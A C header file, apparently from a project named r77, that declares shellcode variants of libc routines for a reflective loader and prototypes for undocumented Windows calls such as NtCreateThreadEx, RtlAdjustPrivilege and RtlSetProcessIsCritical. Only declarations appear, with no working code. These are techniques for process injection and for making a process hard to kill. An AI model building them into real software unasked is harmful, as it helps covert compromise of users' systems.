#include "r77mindef.h"
#ifndef _R77RUNTIME_H
#define _R77RUNTIME_H

// Shellcode variants of libc functions
//  - Used by the reflective loader, prior to any DLL's being loaded
//  - Used where MSVCRT replacements are needed, when /NODEFAULTLIB is used

VOID libc_memcpy(LPVOID dest, LPVOID src, SIZE_T size);
VOID libc_wmemcpy(LPVOID dest, LPVOID src, SIZE_T size);
VOID libc_memset(LPVOID dest, INT value, SIZE_T size);
VOID libc_ltow(LONG value, PWCHAR buffer);
DWORD libc_strhash(LPCSTR str);
DWORD libc_strhashi(LPCSTR str, USHORT length);

// API's that are called by using GetProcAddress

NTSTATUS NTAPI NtQueryObject2(HANDLE handle, OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength);
NTSTATUS NTAPI NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer);
NTSTATUS NTAPI RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue);
NTSTATUS NTAPI RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb);
BOOL IsWindows10OrGreater2();

#endif